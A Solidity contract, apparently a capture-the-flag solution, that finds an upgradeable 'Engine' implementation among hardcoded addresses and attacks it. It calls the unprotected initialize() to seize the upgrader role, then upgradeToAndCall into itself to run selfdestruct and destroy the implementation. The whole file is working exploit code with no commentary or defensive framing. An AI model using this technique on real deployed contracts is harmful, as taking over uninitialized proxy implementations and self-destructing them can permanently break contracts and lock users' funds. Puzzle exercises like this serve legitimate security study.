// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

interface IEngine {
    function initialize() external;
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;
    function upgrader() external view returns (address);
    function horsePower() external view returns (uint256);
}

contract EngineFinder {
    event EngineFound(address engine);
    event ExploitSuccess(address engine);
    
    function findAndExploit() external {
        // Try common deployment addresses from factory nonce 1
        address[] memory possibleEngines = new address[](5);
        possibleEngines[0] = address(0xe7f1725E7734CE288F8367e1Bb143E90bb3F0512); // nonce 1
        possibleEngines[1] = address(0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0); // nonce 2
        possibleEngines[2] = address(0xCf7Ed3AccA5a467e9e704C703E8D87F634fB0Fc9); // nonce 3
        possibleEngines[3] = address(0xDc64a140Aa3E981100a9becA4E685f962f0cF6C9); // nonce 4
        possibleEngines[4] = address(0x5FC8d32690cc91D4c39d9d3abcBD16989F875707); // nonce 5
        
        for (uint i = 0; i < possibleEngines.length; i++) {
            if (tryEngine(possibleEngines[i])) {
                emit EngineFound(possibleEngines[i]);
                exploit(possibleEngines[i]);
                emit ExploitSuccess(possibleEngines[i]);
                break;
            }
        }
    }
    
    function tryEngine(address engine) internal view returns (bool) {
        uint256 size;
        assembly {
            size := extcodesize(engine)
        }
        
        if (size == 0) return false;
        
        try IEngine(engine).horsePower() returns (uint256 hp) {
            return hp == 1000; // Engine initializes with 1000 horsePower
        } catch {
            return false;
        }
    }
    
    function exploit(address engine) internal {
        // Initialize the Engine to become upgrader
        IEngine(engine).initialize();
        
        // Upgrade and destroy
        IEngine(engine).upgradeToAndCall(
            address(this),
            abi.encodeWithSignature("destroy()")
        );
    }
    
    function destroy() external {
        selfdestruct(address(0));
    }
}